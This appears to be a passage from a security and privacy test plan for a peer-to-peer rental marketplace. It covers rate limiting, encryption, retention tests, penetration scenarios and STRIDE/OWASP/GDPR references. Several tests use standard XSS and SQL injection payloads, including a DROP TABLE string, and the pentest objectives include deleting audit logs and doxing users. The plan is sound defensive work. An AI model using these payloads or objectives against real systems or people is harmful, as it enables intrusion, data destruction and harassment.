**Automation potential:** High

---

#### TA-004: Session Expiry and IP Validation Test
**Type:** Functional Security Test
**Requirement(s):** SEC-004
**Scenario:** Verify session expires after inactivity and IP change triggers re-authentication.
**Test approach:** Integration test
**Expected outcome:**
- After 24h no activity: session expires, next request returns 401 Unauthorized
- Request with different IP address: session invalidated, user redirected to login

**Automation potential:** High

---

#### TA-012: Audit Logging Functional Test
**Type:** Functional Security Test
**Requirement(s):** SEC-012
**Scenario:** Verify sensitive actions are logged with correct metadata.
**Test approach:** Integration test
**Expected outcome:**
- Rental approval: audit log contains (timestamp, user_id, action="rental_approval", resource_id=<rental_id>, status="success", ip, user_agent)
- Support query: audit logs searchable by user_id, action, timestamp range

**Automation potential:** High

---

#### TA-018: Data Subject Rights Portal Test
**Type:** Functional Security Test
**Requirement(s):** PRV-007
**Scenario:** Verify user can access, export, delete, and rectify data via self-service portal.
**Test approach:** Integration test
**Expected outcome:**
- Download data: user receives JSON export with email, profile, conversations, ratings
- Delete account: confirmation email sent; account soft-deleted immediately, hard-deleted after 7 days
- Edit profile: user can change email, bio, location
- Export conversations: JSON export includes all messages (unencrypted in export)

**Automation potential:** High

---

#### TA-022: Account Deletion End-to-End Test
**Type:** Functional Security Test
**Requirement(s):** FR-009, PRV-005
**Scenario:** User deletes account; verify data deleted within SLA.
**Test approach:** Integration test
**Expected outcome:**
- User clicks "Delete Account"
- Confirmation email sent
- User confirms via email link (or 7-day grace period expires)
- Account marked deleted; user cannot login
- Data queries for user return no results within 7 days
- Audit log shows deletion event

**Automation potential:** High

---

### 9.2 Security Attack Tests

#### TA-003: Brute Force Login Protection Test
**Type:** Security Attack Test
**Abuse case(s):** SAC-001
**Attack scenario:** Attacker attempts to brute-force login by sending 100 requests with different passwords to the same email address.
**Test approach:** Automated (using custom script or Burp Suite)
**Suggested tools:** Custom Python script with `requests` library; OWASP ZAP with login flow; Burp Suite Intruder
**Expected outcome:**
- First 5 requests: login attempts made
- Requests 6+: HTTP 429 Too Many Requests returned; Retry-After header present
- Account not locked (rate limiting per IP/email, not account lock)
- Subsequent legitimate login after 15-min window: succeeds

**Automation potential:** High

---

#### TA-006: XSS in Messaging Test
**Type:** Security Attack Test
**Abuse case(s):** SAC-002
**Attack scenario:** Send message containing XSS payload (`<script>alert('xss')</script>`) and verify it doesn't execute.
**Test approach:** Automated (Selenium for browser test; API test for response validation)
**Suggested tools:** OWASP ZAP XSS scanner; Burp Suite; custom Selenium test
**Expected outcome:**
- Payload sent via POST /api/messages
- Payload stored in database (sanitized, not raw script)
- When message retrieved and displayed, JavaScript doesn't execute
- Payload rendered as plain text or escaped HTML

**Automation potential:** High

---

#### TA-007: SQL Injection in Search Test
**Type:** Security Attack Test
**Abuse case(s):** SAC-004
**Attack scenario:** Search query with SQL injection payload (`' OR '1'='1`; `DROP TABLE items; --`) and verify no data exfiltration.
**Test approach:** Automated (sqlmap or custom script)
**Suggested tools:** sqlmap, OWASP ZAP; custom script with parameterized query validation
**Expected outcome:**
- Query `tools' OR '1'='1` returns no results (treated as literal string search)
- Query `tools'; DROP TABLE items; --` returns no results; table not dropped
- Error messages don't leak database schema
- No sensitive data exfiltrated

**Automation potential:** High

---

#### TA-008: IDOR on Rental Approval Test
**Type:** Security Attack Test
**Abuse case(s):** SAC-003, SAC-006
**Attack scenario:** Authenticated user (borrower) attempts to approve a rental request they don't own by modifying request ID in API call.
**Test approach:** Automated (API test)
**Suggested tools:** Postman, Burp Suite, custom script
**Expected outcome:**
- Borrower obtains session token by logging in
- Borrower calls PUT /api/rentals/999/approve (rental ID they don't own)
- Server returns 403 Forbidden (or 401 if not authorized at all)
- Rental not approved; audit log shows "unauthorized_access_attempt"
- Error message doesn't reveal existence of rental

**Automation potential:** High

---

#### TA-009: TLS and HSTS Test
**Type:** Security Attack Test
**Abuse case(s):** ST-002 (Session Hijacking)
**Attack scenario:** Verify all traffic uses TLS and HSTS header is present.
**Test approach:** Automated (curl, nmap, or Burp Suite)
**Suggested tools:** curl, testssl.sh, OWASP ZAP
**Expected outcome:**
- HTTP requests redirect to HTTPS (301/308)
- HTTPS connection uses TLS 1.2+ (no SSLv3, TLS 1.0, 1.1)
- HSTS header present: `Strict-Transport-Security: max-age=31536000; includeSubDomains`
- No certificate warnings (valid certificate, trusted CA)

**Automation potential:** High

---

#### TA-013: Error Message Leakage Test
**Type:** Security Attack Test
**Abuse case(s):** ST-001, ST-003
**Attack scenario:** Trigger errors (404, 500, SQL error) and verify sensitive information isn't leaked.
**Test approach:** Automated (API test)
**Suggested tools:** Burp Suite, custom script
**Expected outcome:**
- Invalid user ID: returns 404 "Not Found" (doesn't say "User with ID 456 not found")
- Database error: logs error, returns 500 "Internal Server Error" to user (not "SQL syntax error on line 42")
- Unauthorized access: returns 403 "Forbidden" (not "You don't have permission to view this user's messages")

**Automation potential:** High

---

### 9.3 Privacy Verification Tests

#### TA-010: Message Encryption at Rest Test
**Type:** Privacy Verification
**Requirement(s):** SEC-010, PRV-011
**Scenario:** Send message; verify it's encrypted in database and plaintext doesn't exist.
**Test approach:** Automated (database query + decryption test)
**Expected outcome:**
- Message sent via API: "Hello, is the tool in good condition?"
- Query database: `SELECT ciphertext FROM messages WHERE id=1` → returns binary blob, not plaintext
- Decrypt ciphertext with encryption key: recovers plaintext
- Search database for plaintext substring: "good condition" → no results

**Automation potential:** High

---

#### TA-014: Privacy Notice Visibility Test
**Type:** Privacy Verification
**Requirement(s):** PRV-001
**Scenario:** Verify privacy notice is displayed before signup and contains required GDPR information.
**Test approach:** Manual audit + automated (Selenium test for UI presence)
**Expected outcome:**
- Signup page displays privacy notice summary (1-2 sentences)
- Link to full privacy policy visible
- Full policy (at /privacy) includes: data collected, purpose, retention, user rights, contact info
- Language is plain English, not legalese
- Policy updated within last 12 months

**Automation potential:** Medium

---

#### TA-016: Data Minimisation Test
**Type:** Privacy Verification
**Requirement(s):** PRV-004
**Scenario:** Verify system collects only necessary data (phone optional, location coarse-grained).
**Test approach:** Code review + integration test
**Expected outcome:**
- Signup form: phone number field marked "optional" (no asterisk)
- Location: stored as postal code, not street address; search results show "5 km away", not GPS
- API responses for item listings don't include lender's full address (only postal code)
- Stripe API call sends only (amount, email); not address, phone, item description

**Automation potential:** High

---

#### TA-017: Message Deletion and Retention Test
**Type:** Privacy Verification
**Requirement(s):** PRV-005, PRV-011
**Scenario:** Verify messages auto-delete after 90 days and user can manually delete.
**Test approach:** Integration test (with clock mocked to simulate time passage)
**Expected outcome:**
- Message created at `2024-01-01`
- Clock advanced to `2024-04-01` (91 days later)
- Cron job executes (delete messages older than 90 days)
- Query for message: returns nothing
- User deletes conversation manually: both sender and recipient cannot access conversation

**Automation potential:** High

---

#### TA-020: Message Encryption and Manual Deletion Test
**Type:** Privacy Verification
**Requirement(s):** PRV-011
**Scenario:** Verify encrypted messages can be manually deleted and auto-delete works.
**Test approach:** Integration test
**Expected outcome:**
- Two users exchange encrypted messages
- User A clicks "Delete Conversation"
- Messages deleted from User A's view and database (both sides)
- After 90 days, messages auto-deleted via cron (if not manually deleted)

**Automation potential:** High

---

#### TA-026: DPIA Review
**Type:** Privacy Verification
**Requirement(s):** COMP-002
**Scenario:** Review Data Protection Impact Assessment for high-risk processing (location, ratings, messaging).
**Test approach:** Manual audit
**Expected outcome:**
- DPIA document completed using GDPR template
- Processing identified: location-based search, public rating system, in-app messaging
- Risks identified: doxing, behaviour profiling, harassment, data breach
- Mitigations documented: rate limiting, encryption, retention policy, access controls
- Conclusion: residual risk acceptable / requires additional measures

**Automation potential:** Low

---

### 9.4 Penetration Testing Scenarios

#### TA-027: End-to-End Account Takeover Scenario
**Type:** Penetration Test Scenario
**Scope:** Authentication, session management, authorization
**Objectives:**
1. Gain unauthorized access to a lender account (via password guess, session hijacking, or IDOR)
2. Approve a fraudulent rental request
3. Initiate payment transfer
4. Cover tracks (delete audit logs or request record)

**Key abuse cases to validate:** SAC-001, SAC-002, SAC-003, SAC-006
**Out of scope:** Physical security, social engineering attacks, third-party service compromise (Stripe)

---

#### TA-028: Data Exfiltration via Multiple Vectors
**Type:** Penetration Test Scenario
**Scope:** Input validation, authorization, encryption
**Objectives:**
1. Extract user list (email, name, location) via SQL injection or API enumeration
2. Access other users' messages via IDOR
3. Download encrypted messages from compromised database
4. Attempt to decrypt without encryption key

**Key abuse cases to validate:** SAC-004, SAC-006, PAC-004
**Out of scope:** Social engineering, insider threats, DDoS attacks

---

#### TA-029: Privacy Violation via Location & Profiling
**Type:** Penetration Test Scenario
**Scope:** Location data handling, behaviour profiling
**Objectives:**
1. Scrape public profiles and identify high-value item owners
2. Cross-reference location data with public social media to confirm home address
3. Attempt to dox a specific user using combined data

**Key abuse cases to validate:** PT-002, PAC-002
**Out of scope:** Technical hacking; focus on business logic and privacy design flaws

---

## Appendix A: STRIDE Reference

| Category | Definition | Examples |
|----------|-----------|----------|
| **Spoofing** | Impersonation; pretending to be someone/something else | Account takeover, fake user, forged payment confirmation |
| **Tampering** | Unauthorized modification of data or code | Changing rental price, approving request you don't own, modifying rating |
| **Repudiation** | Denying responsibility for an action | "I never approved that rental", "I didn't send that message" |
| **Information Disclosure** | Unauthorized access to confidential data | Leaking user email, exposing message history, SQL injection exfiltration |
| **Denial of Service** | Making system unavailable | Spam messages, resource exhaustion, crash attacks |
| **Elevation of Privilege** | Gaining unauthorized capabilities | Non-lender approving rentals, user accessing others' data |

---

## Appendix B: LINDDUN Reference

| Category | Definition | Privacy Risk |
|----------|-----------|--------------|
| **Linkability** | Connecting actions/data to an individual across contexts | Profiling behaviour via public ratings + listing history |
| **Identifiability** | Re-identifying supposedly anonymous data | Doxing via location + profile photo |
| **Non-repudiation** | Inability of user to deny an action (harms user) | Permanent public ratings; false accusations stick |
| **Detectability** | Inferring existence of data about a person | Detecting who has valuable items via listing enumeration |
| **Disclosure** | Personal data exposed beyond intended scope | Compromised account = all messages exposed |
| **Unawareness** | User doesn't know data is collected/used | Secret profiling via ratings; secondary use of location data |
| **Non-compliance** | Failure to meet legal/regulatory obligations | No consent, no retention policy, no erasure mechanism |

---

## Appendix C: OWASP Top 10 (2021) Quick Reference

| Rank | Category | P2P Marketplace Relevance |
|------|----------|---------------------------|
| A01 | Broken Access Control | High: IDOR on rentals, messages, profiles; insufficient authorization checks |
| A02 | Cryptographic Failures | High: Unencrypted messages, plaintext storage, no TLS |
| A03 | Injection | High: SQL injection in search, XSS in messaging |
| A04 | Insecure Design | High: No item verification, no dispute resolution, weak authentication |
| A05 | Security Misconfiguration | High: No rate limiting, hardcoded secrets, verbose errors |
| A06 | Vulnerable and Outdated Components | Medium: Dependency vulnerabilities in libraries |
| A07 | Identification and Authentication Failures | High: Weak passwords, no MFA, session hijacking risk |
| A08 | Software and Data Integrity Failures | Medium: No code signing, dependency tampering risk |
| A09 | Logging and Monitoring Failures | High: No audit logs for sensitive actions |
| A10 | Server-Side Request Forgery (SSRF) | Low: Not directly applicable to MVP |

---

## Appendix D: GDPR Privacy by Design Principles

| Principle | Definition | P2P Marketplace Application |
|-----------|-----------|---------------------------|
| **1. Proactive** | Identify and mitigate privacy risks upfront, not reactively | Conduct DPIA for location + ratings processing; design retention policy before launch |
| **2. Privacy by Default** | Privacy protections are default; users opt-in to less privacy, not opt-out | Postal code location by default (not street address); messages encrypted by default; ratings non-deletable by design (necessary for reputation) |
| **3. Embedded into Design** | Privacy built into architecture, not bolted on | End-to-end message encryption; location coarse-grained in data model; audit logging from day one |
| **4. Full Functionality** | Privacy protections don't compromise core features | Ratings still public (needed for trust); location still searchable (needed for marketplace); retention still possible (needed for disputes) |
| **5. End-to-End Security** | Protect data throughout lifecycle (collection, use, storage, deletion) | Consent at signup; encryption at rest; secure deletion on user request |
| **6. Visibility and Transparency** | Users can see what data is collected and how; operators can audit | Privacy notice; data export; audit logging; transparent retention policy |
| **7. User Privacy Paramount** | Respect user rights; prioritize user interests over business convenience | Right to erasure (even if inconvenient); right to object to profiling; minimal data retention |

---

**End of Document**
